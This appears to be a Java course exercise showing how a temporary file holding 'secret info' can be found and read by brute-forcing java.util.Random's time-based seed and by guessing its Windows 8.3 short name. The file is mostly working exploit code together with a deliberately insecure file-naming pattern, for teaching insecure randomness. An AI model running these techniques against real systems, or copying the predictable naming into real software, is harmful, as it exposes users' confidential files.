package assign2;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;

public class Exercise3 {

	public static void main(String[] args) throws IOException {
        Random random = new Random();
        int value = random.nextInt(99_999);

        String fileName = String.format("tempFile%s.bin", value);
        File file = new File(fileName);
        FileWriter writer;
		try {
			writer = new FileWriter(file);
	        writer.write("secret info");
	        writer.close();
		} catch (IOException e) {
			e.printStackTrace();
		}

        //The file is in use
        try {
        	bruteRandomSeed();
        	abuse83Naming();
			Thread.sleep(10000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
        //
        
        file.delete();
	}
	
	private static void bruteRandomSeed() throws IOException {
		// reproduce seed initialization from Random.class
		long seed = new AtomicLong(8682522807148012L).get() * 1181783497276652981L;
		long time = System.nanoTime();
		System.out.println("Brute forcing the seed value due to insecure Random usage");
		for (int i = 0; i < 1000000000; i++) { // look max 1s back
			Random rand = new Random(seed ^ (time - i)); // taken from Random.class
			int value = rand.nextInt(99_999);
			String fileName = String.format("tempFile%s.bin", value);
			File file = new File(fileName); // since we have access to the source code, we can see the naming scheme used and the directory where to look
			if (file.exists()) {
				System.out.println("Found the file at offset from current time -" + i + "; file name:" + file.getName());
				FileReader fileReader = new FileReader(file);
				BufferedReader bufferedReader = new BufferedReader(fileReader);
				String output = "";
				String line = bufferedReader.readLine();
				while(line != null) {
					output += (line + '\n');
					line = bufferedReader.readLine();
				}
				bufferedReader.close();
				fileReader.close();
				System.out.println("File contains: " + output);
				return;
			}
		}
		System.out.println("Brute force failed, increase max value and try again");
	}
	
	private static void abuse83Naming() throws IOException {
		System.out.println("Try to abuse 8.3 naming standard in order to access temp file");
		// abuse 8.3 naming standard
		File file = new File("tempFi~1.bin"); // since we have access to source code, we can see the naming scheme used and also the directory where to look
		if (file.exists()) {
			System.out.println("Found the file abusing 8.3 naming standard");
			FileReader fileReader = new FileReader(file);
			BufferedReader bufferedReader = new BufferedReader(fileReader);
			String output = "";
			String line = bufferedReader.readLine();
			while(line != null) {
				output += (line + '\n');
				line = bufferedReader.readLine();
			}
			bufferedReader.close();
			fileReader.close();
			System.out.println("File contains: " + output);
			return;
		}
		System.out.println("Exploit failed");
	}

}
